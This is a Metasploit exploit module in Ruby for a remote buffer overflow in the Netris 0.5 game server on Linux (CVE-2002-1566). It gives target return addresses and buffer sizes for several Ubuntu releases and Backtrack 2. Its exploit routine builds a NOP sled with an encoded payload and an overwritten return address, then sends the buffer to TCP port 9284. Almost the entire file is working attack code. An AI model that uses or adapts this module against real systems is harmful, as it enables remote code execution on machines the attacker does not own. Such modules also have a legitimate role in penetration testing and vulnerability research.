require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

    include Exploit::Remote::Tcp

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Netris 0.5 Buffer Overflow (Linux)',
            'Description'    => %q{
                      Netris 0.5 exploit.  
                Discovery of this issue is credited to Artur Byszko / bajkero.    
            },
            'Version'     => '0.1.0',
            'Author'         => ['dougsko'],
            'License'        => GPL_LICENSE,
            'References'     =>
                [
                    [ 'BID', '5680'], 
                    [ 'CVE', '2002-1566' ],
                    [ 'URL', 'http://securityvulns.com/files/netrisx.c' ],
                    [ 'URL', 'http://xforce.iss.net/xforce/xfdb/10081' ],
                ],
            'Privileged'     => false,
            'Payload'     =>
                {
                    'Space' => 1024,

                },
            'Platform'    => ['linux'],
            'Targets'    =>
                [
                    [ 'Ubuntu 6.06', 
                        { 'Ret'        => 0x80544f0,
                          'Arch'    => [ ARCH_X86 ],          
                          'BufSize'    => 11552,
                        } 
                    ],
                    
                    [  'Ubuntu 7.04',
                          { 'Ret'        => 0x80544f0,
                                'Arch'        => [ ARCH_X86 ],
                            'BufSize'     => 12148,
                        }
                    ],  

                    [ 'Ubuntu 8.04',
                        { 'Ret'        => 0x80522b0,
                          'Arch'    => [ARCH_X86 ],
                          'BufSize'    => 9692,
                        }
                    ],
                    
                    [  'Backtrack 2',
                        { 'Ret'         => 0x80544f0,
                          'Arch'        => [ ARCH_X86 ],
                            'BufSize'     => 12120,
                        }      
                                  
                    ],

                ],
            'DisclosureDate' => '08/14/2003',
            'DefaultTarget'  => 0 ))

            register_options( [ Opt::RPORT(9284) ], self.class)
    end

    def exploit
        print_status("Generating buffer")
        #buf = pattern_create(16000) # debug
        #buf = "A"*(target['BufSize'] +4)
        buf = make_nops(target['BufSize'] - payload.encoded.length) + payload.encoded + 
[target.ret].pack('V')

        print_status("Sending \#{buf.size} byte buffer...")
        connect
        sock.put(buf)
        sock.get
        handler
        disconnect
    end
end    
